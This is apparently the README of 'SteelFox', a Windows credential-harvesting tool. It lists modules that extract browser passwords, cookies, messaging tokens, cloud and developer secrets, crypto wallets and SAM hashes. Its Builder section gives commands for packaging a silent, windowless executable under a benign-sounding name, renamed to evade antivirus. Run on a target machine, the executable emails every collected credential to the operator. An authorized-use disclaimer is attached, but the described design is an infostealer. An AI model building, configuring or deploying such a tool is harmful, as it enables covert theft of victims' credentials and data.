<p align="center">
  <img src="steelfox/assets/image-steel-fox.png" alt="SteelFox Banner" width="50%" />
</p>

<h1 align="center">SteelFox</h1>
<p align="center"><strong>Advanced Windows Credential & Reconnaissance Framework</strong></p>

<p align="center">
  <img alt="Version" src="https://img.shields.io/badge/version-1.0.0-orange?style=for-the-badge" />
  <img alt="Platform" src="https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078D6?style=for-the-badge&logo=windows" />
  <img alt="Python" src="https://img.shields.io/badge/python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white" />
  <img alt="Modules" src="https://img.shields.io/badge/modules-112-6e40c9?style=for-the-badge" />
  <img alt="Categories" src="https://img.shields.io/badge/categories-12-2ea043?style=for-the-badge" />
</p>

<p align="center">
  <a href="#overview">Overview</a> •
  <a href="#coverage">Coverage</a> •
  <a href="#installation">Installation</a> •
  <a href="#builder">Builder</a> •
  <a href="#usage">Usage</a> •
  <a href="#architecture">Architecture</a> •
  <a href="#outputs">Outputs</a> •
  <a href="#legal-disclaimer">Legal</a>
</p>

---

## Overview

SteelFox is a modern, research-grade **Windows-only** credential recovery and system reconnaissance framework built in **Python 3.10+**.

It is designed for:
- Authorized penetration testing
- Cybersecurity lab work
- Academic security research
- Internal security audits

SteelFox focuses on **real credential extraction**, **session/token recovery**, and **operational host intelligence** across browsers, messaging apps, cloud/dev tooling, Windows internals, and system artifacts.

### Why SteelFox

- Modern architecture (`dataclass`, typed modules, auto-discovery)
- Native support for modern crypto paths (Chromium AES-GCM + DPAPI)
- Broad data acquisition scope: credentials, tokens, sessions, recon artifacts
- Professional report generation: JSON / TXT / HTML
- Scalable module ecosystem with category-based execution

---

## Coverage

### Current Inventory

- **112 modules**
- **12 categories**
- Windows-focused operational coverage

### Categories & Modules

| Category | Count | Modules |
|---|---:|---|
| Browsers | 2 | Chromium Browsers, Firefox & Mozilla Browsers |
| Cloud | 4 | OneDrive, Google Drive, Dropbox, MEGA |
| Databases | 5 | MySQL Workbench, DBeaver, HeidiSQL, pgAdmin 4, Robo 3T |
| DevTools | 21 | Git, SSH Keys, Docker, AWS CLI, Azure CLI, NPM, VS Code, JetBrains IDEs, Postman, Insomnia, GCP / gcloud, Kubernetes, GitHub CLI, Terraform, Maven, Composer, PyPI, NuGet, ngrok, Helm, HashiCorp Vault |
| Gaming | 15 | Steam, Epic Games, Battle.net, OBS Studio, StreamLabs, Spotify, Exodus Wallet, Electrum Wallet, Atomic Wallet, Coinomi Wallet, Bitcoin Core Wallets, Ethereum Keystore, MetaMask, Brave Wallet, Wasabi Wallet |
| Mails | 3 | Outlook, Thunderbird, Mailbird |
| Messaging | 8 | Discord, Slack, Microsoft Teams, Signal, Skype, WhatsApp, Telegram, Telegram Desktop Sessions |
| Network | 9 | WiFi Networks, OpenVPN, NordVPN, ProtonVPN, WireGuard, Cisco AnyConnect, FortiClient VPN, GlobalProtect VPN, Tailscale |
| Passwords | 4 | KeePass, Bitwarden, 1Password, LastPass |
| Reconnaissance | 17 | System Information, Network Reconnaissance, Installed Software, Running Processes, Security Software, Startup Programs, USB History, Clipboard, RDP History, User Privileges, Recent Files, Scheduled Tasks, Active Connections, Shared Folders, Defender Exclusions, WiFi Profiles List, Hosts File |
| Sysadmin | 14 | FileZilla, WinSCP, PuTTY, mRemoteNG, Rclone, VNC, Cyberduck, RDP Connection Manager, CoreFTP, IIS Application Pool, IIS Central Certificate Store, AnyDesk, TeamViewer, WSL |
| Windows | 10 | Credential Manager, Windows Autologon, Windows Vault, DPAPI Credential Files, SAM Hashdump, Unattended Config, Environment Secrets, PowerShell History, Saved RDP Files, Tortoise SVN |

### Data Types Recovered

- Account credentials (username/password)
- API/OAuth/PAT tokens and session material
- Browser secrets (passwords, cookies, autofill, cards, history)
- Windows secrets (Credential Manager, Vault, DPAPI artifacts)
- Dev/cloud authentication traces
- System and network reconnaissance artifacts

---

## Installation

### Prerequisites

- Python **3.10+**
- Windows **10/11**
- Administrator privileges recommended for full coverage

### Install

```powershell
cd SteelFox
pip install -r requirements.txt
```

### Optional Build (Standalone CLI)

```powershell
pip install pyinstaller
python build_console.py
```

This produces `steelfox.exe` — a console-only standalone with no Python dependency.

**Note on Antivirus Detection:** SteelFox executables may trigger false positives in antivirus software due to their credential extraction capabilities. This is expected behavior for security tools. If flagged, add the executable to your AV exclusions or run in a controlled testing environment.

---

## Builder

The **SteelFox Builder** is a standalone graphical tool that lets you package and deploy a fully customized, zero-dependency credential recovery executable — pre-configured with your email reporting settings.

<p align="center">
  <img src="steelfox/assets/screen-shoot.png" alt="SteelFox Builder UI" width="80%" />
</p>

### What the Builder Does

1. Takes your **SMTP credentials** (sender Gmail + app password) and **recipient email** as input  
2. Packages the entire SteelFox engine + your credentials into a single `.exe`  
3. The generated executable, when run on a target machine:
   - Runs silently in the background (no console, no window)  
   - Collects all credentials and system data  
   - Generates an HTML report  
   - Sends the report to your email automatically  

### Running the Builder as a Python Script

```powershell
pip install -r requirements.txt
python builder.py
```

### Running the Builder CLI (headless / Linux / CI)

A full command-line equivalent is available — no GUI, no Tkinter, no display required.
**This is the recommended method for Linux users or CI pipelines.**

```bash
pip install -r requirements.txt

python builder_cli.py \
  --receiver you@gmail.com \
  --sender   you@gmail.com \
  --password "abcd efgh ijkl mnop" \
  --name     SysHealthCheck \
  --output   ./dist
```

All parameters can also be set via environment variables:

| Variable | Description |
|---|---|
| `SF_RECEIVER` | Recipient email |
| `SF_SENDER` | Sender Gmail (defaults to `SF_RECEIVER`) |
| `SF_PASSWORD` | Gmail App Password |
| `SF_NAME` | Output exe name (default: `output`) |
| `SF_OUTPUT` | Output directory (default: current dir) |

> **Important:** PyInstaller does not support cross-compilation.
> The `.exe` can only be produced on a **Windows machine**.
> If you're on Linux, use the GitHub Actions pipeline (see below).

### Building via GitHub Actions (Linux → Windows exe)

The CI/CD pipeline runs on a `windows-latest` runner.
From **any OS**, push a version tag to trigger a release build:

```bash
git tag -a v1.3.0 -m "my release"
git push origin v1.3.0
```

To also build a **payload exe** directly from the pipeline, store your credentials as GitHub Secrets:

| Secret | Value |
|---|---|
| `SF_RECEIVER` | Recipient email |
| `SF_SENDER` | Sender Gmail |
| `SF_PASSWORD` | Gmail App Password |
| `SF_NAME` | Output exe name (optional) |

Or trigger manually with **Actions → Run workflow** and fill in the inputs directly.

### Running the Builder as a Standalone Executable

A pre-built `steelfox_builder.exe` is provided. Just double-click it — no Python installation required.

To rebuild it yourself:

```powershell
python build_builder.py
```

This produces `steelfox_builder.exe` at the root of the project.

### Builder UI Walkthrough

| Field | Description |
|---|---|
| **Output name** | Name of the generated `.exe` (e.g. `SysHealthCheck`) |
| **Output directory** | Folder where the generated `.exe` will be saved |
| **Icon** | Optional `.ico` file for the generated executable |
| **Sender email** | Gmail address used to send the report |
| **App password** | Gmail App Password (16-char, not your regular password) |
| **Receiver email** | Email address that will receive the report |

Once all fields are filled, click **Build Executable**. The build process:

1. Copies the SteelFox source into a temp directory
2. Renames the package to a neutral name to reduce AV heuristic triggers
3. Patches the entry script with your encoded credentials
4. Calls PyInstaller to produce a `--onefile --windowed` executable
5. Moves the final `.exe` to your chosen output directory

### Gmail App Password Setup

The builder requires a **Gmail App Password**, not your account password:

1. Go to [Google Account Security](https://myaccount.google.com/security)
2. Enable **2-Step Verification**
3. Under "App passwords", create a new one (name it anything)
4. Use the generated 16-character code as the app password in the builder

### Architecture of the Generated Executable

```text
YourExe.exe  (PyInstaller --onefile --windowed)
└── _MEI*/
    └── sysdiag/         ← SteelFox engine, renamed for discretion
        ├── core/
        └── modules/
```

- Runs without any console window  
- No Python installation required on the target machine  
- Report is sent by email; a local cache is saved in `%TEMP%\sys_diag_cache.html`  
- Self-contained: all dependencies embedded

---

## Usage

```powershell
python steelfox.py --list-modules
python steelfox.py all
python steelfox.py browsers -oJ
python steelfox.py all -oA -output .\reports
python steelfox.py reconnaissance -q -oJ
```

### CLI Flags

| Flag | Description |
|---|---|
| `-oJ` | JSON output |
| `-oN` | TXT output |
| `-oH` | HTML output |
| `-oA` | All output formats |
| `-output <dir>` | Output directory |
| `-p <password>` | Master password input (when needed) |
| `-q` | Quiet mode |
| `-v` / `-vv` | Verbose logging |
| `--list-modules` | List all modules |

---

## Outputs

SteelFox can generate:

- **JSON**: structured machine-readable report
- **TXT**: operator-friendly plaintext report
- **HTML**: polished dark-themed report for delivery/review

### Reporting Design

- Multi-user aware aggregation
- Category + module grouping
- Timestamped result files
- UTF-8 output handling

---

## Architecture

```text
SteelFox/
├── steelfox.py
├── steelfox.spec
├── requirements.txt
├── README.md
└── steelfox/
    ├── core/
    │   ├── config.py
    │   ├── module_base.py
    │   ├── module_loader.py
    │   ├── runner.py
    │   ├── output.py
    │   ├── privileges.py
    │   └── winapi.py
    ├── modules/
    │   ├── browsers/
    │   ├── messaging/
    │   ├── mails/
    │   ├── passwords/
    │   ├── cloud/
    │   ├── gaming/
    │   ├── devtools/
    │   ├── network/
    │   ├── sysadmin/
    │   ├── databases/
    │   ├── windows/
    │   └── reconnaissance/
    └── assets/
```

### Design Principles

- Modular, typed, category-driven architecture
- Automatic module discovery (no hardcoded module registry)
- Deferred execution model for context-sensitive modules
- Separation between collection engine and report layer

---

## Professional Notes

- This project is intentionally Windows-specialized for depth and reliability.
- Results vary by privilege level and endpoint hardening policy.
- Some collected artifacts are encrypted by design and may require additional context for offline exploitation.

---

## Legal Disclaimer

SteelFox must be used **only** in authorized contexts:

- Internal security assessment with written approval
- Academic/lab environments you control
- Contracted penetration testing engagements

Unauthorized access, credential collection, or lateral use is illegal and unethical.
You are solely responsible for lawful operation.

---

## Author

<p align="left">
  <img src="https://avatars.githubusercontent.com/u/118616410?v=4" alt="Fox GitHub Avatar" width="74" style="border-radius:50%;" />
</p>

- **Fox**
- Version: **1.0.0**
- Inspiration: (AlessandroZ)

---

## Tech Stack

<p>
  <img alt="Python" src="https://img.shields.io/badge/Python-3776AB?style=flat-square&logo=python&logoColor=white" />
  <img alt="PyCryptodome" src="https://img.shields.io/badge/PyCryptodome-0C7BDC?style=flat-square&logo=securityscorecard&logoColor=white" />
  <img alt="SQLite" src="https://img.shields.io/badge/SQLite-003B57?style=flat-square&logo=sqlite&logoColor=white" />
  <img alt="Windows API" src="https://img.shields.io/badge/Win32%20API-0078D6?style=flat-square&logo=windows&logoColor=white" />
  <img alt="PowerShell" src="https://img.shields.io/badge/PowerShell-5391FE?style=flat-square&logo=powershell&logoColor=white" />
  <img alt="Git" src="https://img.shields.io/badge/Git-F05032?style=flat-square&logo=git&logoColor=white" />
  <img alt="GitHub" src="https://img.shields.io/badge/GitHub-181717?style=flat-square&logo=github&logoColor=white" />
</p>

---

## Footer

<p align="center">
  <img src="steelfox/assets/logo-steel-fox-icon.png" alt="SteelFox Logo" width="58" />
</p>

<p align="center">
  <strong>SteelFox</strong> — professional credential auditing for authorized Windows security operations.
</p>

<p align="center">
  Built with precision by <strong>Fox</strong>.
</p>
